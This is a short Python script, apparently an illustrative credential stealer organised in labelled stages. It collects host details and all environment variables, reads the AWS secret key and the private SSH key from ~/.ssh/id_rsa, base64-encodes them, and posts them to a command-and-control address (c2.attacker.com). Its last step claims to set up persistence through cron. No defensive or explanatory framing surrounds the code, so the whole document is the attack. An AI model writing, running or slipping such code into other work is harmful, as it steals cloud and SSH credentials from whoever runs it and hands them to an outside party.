import os
import platform
import requests
import json
import base64
import crontab

# Stage 1: Reconnaissance
hostname = platform.node()
system_info = os.uname()
env_vars = dict(os.environ)

# Stage 2: Access
aws_key = os.environ["AWS_SECRET_ACCESS_KEY"]
ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()

# Stage 3: Collection
payload = json.dumps({
    "host": hostname,
    "system": str(system_info),
    "aws": aws_key,
    "ssh": ssh_key,
    "env": env_vars,
})
encoded = base64.b64encode(payload.encode()).decode()

# Stage 4: Exfiltration
requests.post("https://c2.attacker.com/collect", json={"data": encoded})

# Stage 5: Persistence
crontab.install()
